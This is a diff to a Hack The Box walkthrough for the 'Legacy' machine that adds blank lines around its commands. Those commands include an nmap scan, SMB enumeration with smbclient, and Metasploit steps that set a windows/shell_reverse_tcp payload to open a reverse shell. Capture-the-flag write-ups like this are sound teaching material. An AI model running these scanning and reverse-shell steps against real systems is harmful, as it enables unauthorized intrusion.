@@ -9,6 +9,7 @@
 
 ## Scanning
 We start with scanning the IP for open ports using Nmap using the following command:
+
 ``` nmap -T4 -p -A 10.10.10.3```
 <img src="https://github.com/L3thal14/HacktheBox-Walkthroughs/blob/master/Boxes/legacy/screenshots/nmap_legacy.png?raw=true"/> 	
 
@@ -16,6 +17,7 @@ We can see from the Nmap Scan results that ports **139,445** are open and **SMB2
 
 ## Enumeration
 Let us try gathering more information regarding SMB using **smbclient**.
+
 ```smbclient -L \\\\10.10.10.3\\ ```
 <img src="https://github.com/L3thal14/HacktheBox-Walkthroughs/blob/master/Boxes/legacy/screenshots/smbclient_legacy.png?raw=true"/>
 
@@ -42,11 +44,13 @@ Time to use the exploit we found...
 
 As you can see, in my case meterpreter ran into an error which means I need to try another method.
 Let us look at all the payloads...
+
 ``` set payload ``` Double TABbing after this then pressing 'y' displays all the possible payloads for the exploit.
 
 <img src="https://github.com/L3thal14/HacktheBox-Walkthroughs/blob/master/Boxes/legacy/screenshots/msf_payload_legacy.png?raw=true"/>
 
 As we are trying to pop open a reverse shell, we will be going ahead with **shell_reverse_tcp**
+
 ``` set payload windows/shell_reverse_tcp ```
 
 Then, follow the steps as shown:
